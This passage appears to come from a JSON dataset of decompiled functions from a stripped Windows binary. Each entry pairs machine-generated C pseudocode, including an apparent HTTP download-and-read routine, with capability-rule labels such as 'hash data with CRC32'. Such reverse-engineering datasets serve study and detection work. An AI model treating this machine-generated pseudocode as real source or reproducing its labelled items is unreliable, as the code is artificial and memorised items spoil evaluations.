uint32_t var_d84h;\n    uint *var_d7ch;\n    uint var_d6ch;\n    uint32_t var_d68h;\n    uint *var_d60h;\n    int32_t var_d50h;\n    uint32_t var_d4ch;\n    uint *var_d44h;\n    uint var_d34h;\n    uint32_t var_d30h;\n    uint *var_d28h;\n    uint32_t var_d18h;\n    uint32_t var_d14h;\n    uint32_t var_d0ch;\n    uint var_cfch;\n    uint32_t var_cf8h;\n    uint32_t var_cf0h;\n    uint var_ce0h;\n    uint32_t var_cdch;\n    uint var_cd4h;\n    uint var_ad4h;\n    uint var_8e0h;\n    uint var_110h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e1c5;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_de0h = arg_8h;\n    var_dd4h = 0;\n    var_4h = 1;\n    fcn.0042acb0(&var_cd4h, 0, 0x200, var_10h);\n    fcn.0042acb0(&var_ad4h, 0, 500);\n    var_da0h = 0xf;\n    var_da4h = 0;\n    var_db4h = var_db4h & 0xffffff00;\n    uVar1 = fcn.0042b420(0x4453cc);\n    fcn.00406270(0x4453cc, uVar1);\n    var_d30h = 0xf;\n    var_d34h = 0;\n    var_d44h = var_d44h & 0xffffff00;\n    var_d4ch = 0xf;\n    var_d50h = 0;\n    var_d60h = var_d60h & 0xffffff00;\n    var_d14h = 0xf;\n    var_d18h = 0;\n    var_d28h = var_d28h & 0xffffff00;\n    var_d84h = 0xf;\n    var_d88h = 0;\n    var_d98h = var_d98h & 0xffffff00;\n    var_d68h = 0xf;\n    var_d6ch = 0;\n    var_d7ch = var_d7ch & 0xffffff00;\n    var_dbch = 0xf;\n    var_dc0h = 0;\n    var_dd0h = var_dd0h & 0xffffff00;\n    var_4h._0_1_ = 8;\n    var_dd8h = 0;\n    uVar1 = fcn.0040d9a0(&var_d0ch, &arg_ch);\n    var_4h._0_1_ = 9;\n    fcn.004063b0(uVar1);\n    var_4h = CONCAT31(var_4h._1_3_, 8);\n    if (0xf < var_cf8h) {\n        fcn.0042ac49(var_d0ch);\n    }\n    uVar2 = fcn.0042b420(0x447154);\n    uVar10 = 8;\n    if (var_d18h < 8) {\n        uVar10 = var_d18h;\n    }\n    uVar4 = uVar10;\n    if (uVar2 <= uVar10) {\n        uVar4 = uVar2;\n    }\n    puVar5 = var_d28h;\n    if (var_d14h < 0x10) {\n        puVar5 = &var_d28h;\n    }\n    iVar3 = fcn.0042c233(puVar5, 0x447154, uVar4);\n    if (((iVar3 == 0) && (uVar2 <= uVar10)) && (uVar10 == uVar2)) {\n        var_dd8h = 8;\n    }\n    else {\n        uVar2 = fcn.0042b420(0x446ff0);\n        uVar10 = 7;\n        if (var_d18h < 7) {\n            uVar10 = var_d18h;\n        }\n        uVar4 = uVar10;\n        if (uVar2 <= uVar10) {\n            uVar4 = uVar2;\n        }\n        puVar5 = var_d28h;\n        if (var_d14h < 0x10) {\n            puVar5 = &var_d28h;\n        }\n        iVar3 = fcn.0042c233(puVar5, 0x446ff0, uVar4);\n        if (((iVar3 == 0) && (uVar2 <= uVar10)) && (uVar10 == uVar2)) {\n            var_dd8h = 7;\n        }\n    }\n    var_ddch._0_1_ = 0x2f;\n    iVar3 = fcn.0040b910(&var_ddch, var_dd8h + 1, 1);\n    if (iVar3 == -1) {\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n        uVar1 = fcn.0042b420(0x4453cc);\n        fcn.00406270(0x4453cc, uVar1);\n        puVar5 = &var_cf0h;\n        var_4h = CONCAT31(var_4h._1_3_, 10);\n        uVar10 = 1;\n    }\n    else {\n        puVar5 = fcn.0040e670(&var_d0ch, iVar3, 0xffffffff);\n        var_4h = 0xb;\n        uVar10 = 2;\n    }\n    var_dd4h = uVar10;\n    fcn.004063b0(puVar5);\n    if ((uVar10 & 2) != 0) {\n        uVar10 = uVar10 & 0xfffffffd;\n        var_dd4h = uVar10;\n        if (0xf < var_cf8h) {\n            fcn.0042ac49(var_d0ch);\n        }\n        var_cf8h = 0xf;\n        var_cfch = 0;\n        var_d0ch = var_d0ch & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 1) != 0) && (uVar10 = uVar10 & 0xfffffffe,  var_dd4h = uVar10,  0xf < var_cdch)) {\n        fcn.0042ac49(var_cf0h);\n    }\n    if (iVar3 == -1) {\n        puVar5 = var_d28h;\n        if (var_d14h < 0x10) {\n            puVar5 = &var_d28h;\n        }\n        iVar3 = puVar5 + var_d18h;\n    }\n    else {\n        puVar5 = var_d28h;\n        if (var_d14h < 0x10) {\n            puVar5 = &var_d28h;\n        }\n        iVar3 = puVar5 + iVar3;\n    }\n    puVar5 = var_d28h;\n    if (var_d14h < 0x10) {\n        puVar5 = &var_d28h;\n    }\n    var_cdch = 0xf;\n    var_ce0h = 0;\n    var_cf0h = var_cf0h & 0xffffff00;\n    fcn.0040bcc0(puVar5 + var_dd8h, iVar3, var_de8h);\n    var_4h._0_1_ = 0xc;\n    fcn.004063b0(&var_cf0h);\n    var_4h._0_1_ = 8;\n    if (0xf < var_cdch) {\n        fcn.0042ac49(var_cf0h);\n    }\n    uVar1 = fcn.0042b420(0x447150);\n    iVar3 = fcn.0040b910(0x447150, 0, uVar1);\n    if (iVar3 == -1) {\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n        fcn.00406180(&var_d44h, 0, 0xffffffff);\n        puVar5 = &var_cf0h;\n        var_4h = 0xe;\n        uVar10 = uVar10 | 8;\n    }\n    else {\n        puVar5 = fcn.0040e670(&var_d0ch, 0, iVar3);\n        var_4h = CONCAT31(var_4h._1_3_, 0xd);\n        uVar10 = uVar10 | 4;\n    }\n    var_dd4h = uVar10;\n    fcn.004063b0(puVar5);\n    if ((uVar10 & 8) != 0) {\n        uVar10 = uVar10 & 0xfffffff7;\n        var_dd4h = uVar10;\n        if (0xf < var_cdch) {\n            fcn.0042ac49(var_cf0h);\n        }\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 4) != 0) && (uVar10 = uVar10 & 0xfffffffb,  var_dd4h = uVar10,  0xf < var_cf8h)) {\n        fcn.0042ac49(var_d0ch);\n    }\n    uVar1 = fcn.0042b420(0x446fd4);\n    iVar3 = fcn.0040b910(0x446fd4, 0, uVar1);\n    if (iVar3 == -1) {\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n        uVar1 = fcn.0042b420(0x4453cc);\n        fcn.00406270(0x4453cc, uVar1);\n        puVar5 = &var_cf0h;\n        var_4h = 0x10;\n        uVar10 = uVar10 | 0x20;\n    }\n    else {\n        puVar5 = fcn.0040e670(&var_d0ch, iVar3 + 1, 0xffffffff);\n        var_4h = CONCAT31(var_4h._1_3_, 0xf);\n        uVar10 = uVar10 | 0x10;\n    }\n    var_dd4h = uVar10;\n    fcn.004063b0(puVar5);\n    if ((uVar10 & 0x20) != 0) {\n        uVar10 = uVar10 & 0xffffffdf;\n        var_dd4h = uVar10;\n        if (0xf < var_cdch) {\n            fcn.0042ac49(var_cf0h);\n        }\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x10) != 0) && (uVar10 = uVar10 & 0xffffffef,  var_dd4h = uVar10,  0xf < var_cf8h)) {\n        fcn.0042ac49(var_d0ch);\n    }\n    if (iVar3 == -1) {\n        iVar3 = var_d50h;\n    }\n    uVar1 = fcn.0040e670(&var_d0ch, 0, iVar3);\n    var_4h._0_1_ = 0x11;\n    fcn.004063b0(uVar1);\n    var_4h._0_1_ = 8;\n    if (0xf < var_cf8h) {\n        fcn.0042ac49(var_d0ch);\n    }\n    if (var_dd8h < 1) {\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n        uVar1 = fcn.0042b420(0x4453cc);\n        fcn.00406270(0x4453cc, uVar1);\n        puVar5 = &var_cf0h;\n        var_4h = 0x13;\n        uVar10 = uVar10 | 0x80;\n    }\n    else {\n        puVar5 = fcn.0040e670(&var_d0ch, 0, var_dd8h + -3);\n        var_4h = CONCAT31(var_4h._1_3_, 0x12);\n        uVar10 = uVar10 | 0x40;\n    }\n    var_dd4h = uVar10;\n    fcn.004063b0(puVar5);\n    if (uVar10 < '\\0') {\n        uVar10 = uVar10 & 0xffffff7f;\n        var_dd4h = uVar10;\n        if (0xf < var_cdch) {\n            fcn.0042ac49(var_cf0h);\n        }\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x40) != 0) && (uVar10 = uVar10 & 0xffffffbf,  var_dd4h = uVar10,  0xf < var_cf8h)) {\n        fcn.0042ac49(var_d0ch);\n    }\n    uVar1 = fcn.0042b420(0x44714c);\n    iVar3 = fcn.0040b910(0x44714c, 0, uVar1);\n    if (iVar3 == -1) {\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n        uVar1 = fcn.0042b420(0x4453cc);\n        fcn.00406270(0x4453cc, uVar1);\n        puVar5 = &var_cf0h;\n        var_4h = 0x15;\n        uVar10 = uVar10 | 0x200;\n    }\n    else {\n        puVar5 = fcn.0040e670(&var_d0ch, iVar3 + 1, 0xffffffff);\n        var_4h = CONCAT31(var_4h._1_3_, 0x14);\n        uVar10 = uVar10 | 0x100;\n    }\n    var_dd4h = uVar10;\n    fcn.004063b0(puVar5);\n    if ((uVar10 & 0x200) != 0) {\n        uVar10 = uVar10 & 0xfffffdff;\n        var_dd4h = uVar10;\n        if (0xf < var_cdch) {\n            fcn.0042ac49(var_cf0h);\n        }\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x100) != 0) && (uVar10 = uVar10 & 0xfffffeff,  var_dd4h = uVar10,  0xf < var_cf8h)) {\n        fcn.0042ac49(var_d0ch);\n    }\n    if (iVar3 == -1) {\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n        fcn.00406180(&var_d44h, 0, 0xffffffff);\n        puVar5 = &var_cf0h;\n        var_4h = 0x17;\n        uVar10 = uVar10 | 0x800;\n    }\n    else {\n        puVar5 = fcn.0040e670(&var_d0ch, 0, iVar3);\n        var_4h = CONCAT31(var_4h._1_3_, 0x16);\n        uVar10 = uVar10 | 0x400;\n    }\n    var_dd4h = uVar10;\n    fcn.004063b0(puVar5);\n    if ((uVar10 & 0x800) != 0) {\n        uVar10 = uVar10 & 0xfffff7ff;\n        if (0xf < var_cdch) {\n            fcn.0042ac49(var_cf0h);\n        }\n        var_cdch = 0xf;\n        var_ce0h = 0;\n        var_cf0h = var_cf0h & 0xffffff00;\n    }\n    var_4h = 8;\n    if (((uVar10 & 0x400) != 0) && (0xf < var_cf8h)) {\n        fcn.0042ac49(var_d0ch);\n    }\n    puVar5 = var_d60h;\n    if (var_d4ch < 0x10) {\n        puVar5 = &var_d60h;\n    }\n    (**0x469174)(puVar5);\n    puVar5 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar5 = &arg_ch;\n    }\n    (**0x469174)(puVar5);\n    if (arg_28h == 0) {\n        puVar5 = arg_2ch;\n        if (arg_40h < 0x10) {\n            puVar5 = &arg_2ch;\n        }\n        iVar3 = (**0x469194)(puVar5, 0, 0, 0, 0);\n        var_dd8h = iVar3;\n    }\n    else {\n        puVar6 = fcn.00420bf0(&var_d0ch);\n        var_4h._0_1_ = 0x18;\n        if (0xf < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        puVar5 = NULL;\n        iVar3 = (**0x469194)(puVar6, 0, 0, 0, 0);\n        var_4h = CONCAT31(var_4h._1_3_, 8);\n        var_dd8h = iVar3;\n        if (0xf < var_cf8h) {\n            fcn.0042ac49(var_d0ch);\n        }\n        var_cf8h = 0xf;\n        var_cfch = 0;\n        var_d0ch = var_d0ch & 0xffffff00;\n    }\n    puVar6 = var_d7ch;\n    if (var_d68h < 0x10) {\n        puVar6 = &var_d7ch;\n    }\n    uVar1 = fcn.0042d9e0(puVar6);\n    puVar6 = var_d98h;\n    if (var_d84h < 0x10) {\n        puVar6 = &var_d98h;\n    }\n    iVar7 = (**0x469288)(puVar6, 0x447144);\n    iVar7 = (-(iVar7 != 0) & 0xff800000) + 0x4800000;\n    if (iVar3 != 0) {\n        puVar6 = var_d60h;\n        if (var_d4ch < 0x10) {\n            puVar6 = &var_d60h;\n        }\n        iVar3 = (**0x4692b0)(var_dd8h, puVar6, uVar1, 0, 0, 3, iVar7, 0);\n        if (iVar3 != 0) {\n            puVar6 = var_d44h;\n            if (var_d30h < 0x10) {\n                puVar6 = &var_d44h;\n            }\n            iVar7 = (**0x4692f4)(iVar3, 0x447140, puVar6, 0, 0, 0, iVar7, 0);\n            if (iVar7 != 0) {\n                iVar8 = (**0x469274)(iVar7, 0, 0, 0, 0);\n                var_de8h = 0x100;\n                iVar9 = (**0x46930c)(iVar7, 0x13, &var_110h, &var_de8h, 0);\n                if ((iVar9 == 0) || (iVar9 = fcn.0042d9e0(&var_110h),  iVar9 != 200)) {\n                    fcn.00406370(0x447138);\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    fcn.00405ce0();\n                    goto code_r0x0040fd01;\n                }\n                if (iVar8 != 0) {\n                    iVar8 = (**0x4691b8)(iVar7, &var_8e0h, 1999, &var_dd4h);\n                    while ((iVar8 != 0 && (var_dd4h != 0))) {\n                        *(&var_8e0h + var_dd4h) = 0;\n                        uVar1 = fcn.0040e700(&var_cf0h, &var_db4h, &var_8e0h);\n                        var_4h._0_1_ = 0x19;\n                        fcn.004063b0(uVar1);\n                        var_4h = CONCAT31(var_4h._1_3_, 8);\n                        if (0xf < var_cdch) {\n                            fcn.0042ac49(var_cf0h);\n                        }\n                        iVar8 = (**0x4691b8)(iVar7, &var_8e0h, 1999, &var_dd4h);\n                    }\n                }\n                (**0x469190)(iVar7);\n            }\n            (**0x469190)(iVar3);\n        }\n        (**0x469190)(var_dd8h);\n    }\n    *(var_de0h + 0x14) = 0xf;\n    *(var_de0h + 0x10) = 0;\n    *var_de0h = 0;\n    fcn.004063b0(&var_db4h);\n    if (0xf < var_dbch) {\n        fcn.0042ac49(var_dd0h);\n    }\n    var_dbch = 0xf;\n    var_dc0h = 0;\n    var_dd0h = var_dd0h & 0xffffff00;\n    if (0xf < var_d68h) {\n        fcn.0042ac49(var_d7ch);\n    }\n    var_d68h = 0xf;\n    var_d6ch = 0;\n    var_d7ch = var_d7ch & 0xffffff00;\n    if (0xf < var_d84h) {\n        fcn.0042ac49(var_d98h);\n    }\n    var_d84h = 0xf;\n    var_d88h = 0;\n    var_d98h = var_d98h & 0xffffff00;\n    if (0xf < var_d14h) {\n        fcn.0042ac49(var_d28h);\n    }\n    var_d14h = 0xf;\n    var_d18h = 0;\n    var_d28h = var_d28h & 0xffffff00;\n    if (0xf < var_d4ch) {\n        fcn.0042ac49(var_d60h);\n    }\n    var_d4ch = 0xf;\n    var_d50h = 0;\n    var_d60h = var_d60h & 0xffffff00;\n    if (0xf < var_d30h) {\n        fcn.0042ac49(var_d44h);\n    }\n    var_d30h = 0xf;\n    var_d34h = 0;\n    var_d44h = var_d44h & 0xffffff00;\n    if (0xf < var_da0h) {\n        fcn.0042ac49(var_db4h);\n    }\n    var_da0h = 0xf;\n    var_da4h = 0;\n    var_db4h = var_db4h & 0xffffff00;\n    if (0xf < arg_20h) {\n        fcn.0042ac49(arg_ch);\n    }\n    arg_20h = 0xf;\n    arg_1ch = 0;\n    arg_ch = arg_ch & 0xffffff00;\n    if (0xf < arg_40h) {\n        fcn.0042ac49(arg_2ch);\n    }\ncode_r0x0040fd01:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(puVar5);\n    return;\n}\n",
        "token_count": 6006
    },
    "004156d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004156d0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4473c8;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "004187f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004187f0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4473d0;\n    fcn.0042a8d9(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "004189a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004189a0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x44793c;\n    if (in_ECX[5] < 1) {\n        if (in_ECX[5] < 0) {\n            fcn.0042c228(in_ECX[4]);\n        }\n    }\n    else {\n        fcn.0042aeff(in_ECX[4]);\n    }\n    *in_ECX = 0x4473c8;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "004189f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004189f0(uint32_t arg_8h)\n\n{\n    fcn.0042b3a3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00418f80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00418f80(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    \n    piVar1 = in_ECX + -4;\n    *(*(*piVar1 + 4) + -0x10 + in_ECX) = 0x44792c;\n    *in_ECX = 0x4473d0;\n    fcn.0042a8d9(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49(piVar1);\n    }\n    return piVar1;\n}\n",
        "token_count": 145
    },
    "00418fc0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418fc0(uint32_t arg_8h)\n\n{\n    fcn.00418c30();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "004192a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004192a0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    bool bVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint var_44h;\n    uint var_20h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e9eb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar4 = false;\n    var_10h = NULL;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        arg_8h_00 = 0x18;\n        puVar2 = fcn.0042b9b1(0x18);\n        var_4h = 0;\n        var_10h = puVar2;\n        if (puVar2 == NULL) {\n            puVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            fcn.00419140(arg_8h_00);\n            bVar4 = true;\n            puVar2[1] = 0;\n            *puVar2 = 0x44793c;\n            puVar3 = fcn.0042a321(&var_20h);\n            puVar2[2] = *puVar3;\n            puVar2[3] = puVar3[1];\n            puVar2[4] = puVar3[2];\n            puVar2[5] = puVar3[3];\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = puVar2;\n        if (bVar4) {\n            fcn.004191f0(arg_8h_00, uVar1);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 525
    },
    "004196d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004196d0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    bool bVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint var_34h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ea4b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    bVar3 = false;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        arg_8h_00 = 8;\n        puVar2 = fcn.0042b9b1(8);\n        var_4h = 0;\n        if (puVar2 == NULL) {\n            puVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = *(*arg_ch + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = *arg_ch + 0x1c;\n            }\n            fcn.00419140(arg_8h_00);\n            bVar3 = true;\n            puVar2[1] = 0;\n            *puVar2 = 0x447a04;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = puVar2;\n        if (bVar3) {\n            fcn.004191f0(arg_8h_00, uVar1);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 415
    },
    "004197d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004197d0(int32_t *param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43ea78;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    iVar4 = *(*param_1 + 4) + param_1;\n    if (*(*(*param_1 + 4) + 0xc + param_1) == 0) {\n        if (*(iVar4 + 0x3c) != 0) {\n            fcn.00419780();\n        }\n        if ((var_8h == '\\0') && ((*(*(*param_1 + 4) + 0x14 + param_1) & 1) != 0)) {\n            arg_8h = fcn.00415720(&param_2);\n            var_4h = 0;\n            iVar4 = fcn.00419590(arg_8h);\n            fcn.00415680();\n            piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n            var_4h = 1;\n            if ((*piVar1[8] == NULL) || (*piVar1[0xc] < 1)) {\n                uVar3 = (**(*piVar1 + 0x18))();\n            }\n            else {\n                uVar3 = **piVar1[8];\n            }\n            while (uVar3 != 0xffffffff) {\n                if ((*(*(iVar4 + 0x10) + (uVar3 & 0xff) * 2) & 0x48) == 0) goto code_r0x004198c2;\n                uVar3 = fcn.00419380();\n            }\n            uVar3 = *(*(*param_1 + 4) + 0xc + param_1);\n            arg_8h_00 = uVar3 | 1;\n            if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n                arg_8h_00 = uVar3 | 5;\n            }\n            fcn.00418a20(arg_8h_00, 0);\ncode_r0x004198c2:\n            var_4h = 0xffffffff;\n        }\n        iVar2 = *param_1;\n        iVar4 = *(iVar2 + 4) + param_1;\n        if (*(iVar4 + 0xc) == 0) {\n            *in_FS_OFFSET = var_ch_2;\n            return CONCAT31(iVar2 >> 8, 1);\n        }\n    }\n    uVar3 = *(iVar4 + 0xc) | 2;\n    if (*(iVar4 + 0x38) == 0) {\n        uVar3 = *(iVar4 + 0xc) | 6;\n    }\n    uVar3 = fcn.00418a20(uVar3, 0);\n    *in_FS_OFFSET = var_ch_2;\n    return uVar3 & 0xffffff00;\n}\n",
        "token_count": 790
    },
    "0041abe0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041abe0(uint32_t arg_8h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ebf8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *in_ECX = 0x447a44;\n    var_4h = 0;\n    if ((in_ECX[0x15] != 0) && (*in_ECX[4] == in_ECX + 0x12)) {\n        uVar1 = in_ECX[0x10];\n        *in_ECX[4] = in_ECX[0xf];\n        *in_ECX[8] = uVar1;\n        *in_ECX[0xc] = 0;\n    }\n    if (*(in_ECX + 0x14) != '\\0') {\n        fcn.0041a8f0(uVar2);\n    }\n    var_4h = 0xffffffff;\n    fcn.00418c30();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 332
    },
    "0041d320": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041d320(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    fcn.0041d250();\n    *in_ECX = 0x4473d0;\n    fcn.0042a8d9(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49(in_ECX + -0x1a);\n    }\n    return in_ECX + -0x1a;\n}\n",
        "token_count": 115
    },
    "004213b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004213b0(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x40) & 1) != 0) {\n        fcn.0042ac49(**(param_1 + 0x10));\n    }\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    **(param_1 + 0x14) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    *(param_1 + 0x40) = *(param_1 + 0x40) & 0xfffffffe;\n    *(param_1 + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 206
    },
    "004214f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004214f0(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4h;\n    \n    uVar2 = **(in_ECX + 0x24);\n    if ((uVar2 != 0) && (*(in_ECX + 0x3c) < uVar2)) {\n        *(in_ECX + 0x3c) = uVar2;\n    }\n    if (((arg_18h & 1) == 0) || (iVar5 = **(in_ECX + 0x20),  iVar5 == 0)) {\n        if (((arg_18h & 2) == 0) || (uVar2 = **(in_ECX + 0x24),  uVar2 == 0)) {\n            if ((arg_ch | arg_10h) == 0) goto code_r0x0042168d;\n        }\n        else {\n            if (arg_14h == 2) {\n                uVar3 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n                arg_10h = arg_10h + (uVar3 >> 0x1f) + CARRY4(arg_ch, uVar3);\n                arg_ch = arg_ch + uVar3;\n            }\n            else if (arg_14h == 1) {\n                uVar3 = uVar2 - **(in_ECX + 0x10);\n                arg_10h = arg_10h + (uVar3 >> 0x1f) + CARRY4(arg_ch, uVar3);\n                arg_ch = arg_ch + uVar3;\n            }\n            else if (arg_14h != 0) {\n                arg_10h = *0x4488ec;\n                arg_ch = *0x4488e8;\n            }\n            if (-1 < arg_10h) {\n                uVar3 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n                iVar5 = uVar3 >> 0x1f;\n                if ((arg_10h <= iVar5) && ((arg_10h < iVar5 || (arg_ch <= uVar3)))) {\n                    iVar5 = (**(in_ECX + 0x10) - uVar2) + arg_ch;\n                    **(in_ECX + 0x34) = **(in_ECX + 0x34) - iVar5;\n                    **(in_ECX + 0x24) = **(in_ECX + 0x24) + iVar5;\n                    goto code_r0x0042168d;\n                }\n            }\n        }\n    }\n    else {\n        if (arg_14h == 2) {\n            uVar2 = *(in_ECX + 0x3c) - **(in_ECX + 0x10);\n            arg_10h = arg_10h + (uVar2 >> 0x1f) + CARRY4(arg_ch, uVar2);\n            arg_ch = arg_ch + uVar2;\n        }\n        else if (arg_14h == 1) {\n            if ((arg_18h & 2) == 0) {\n                uVar2 = iVar5 - **(in_ECX + 0x10);\n                arg_10h = arg_10h + (uVar2 >> 0x1f) + CARRY4(arg_ch, uVar2);\n                arg_ch = arg_ch + uVar2;\n            }\n            else {\ncode_r0x00421561:\n                arg_10h = 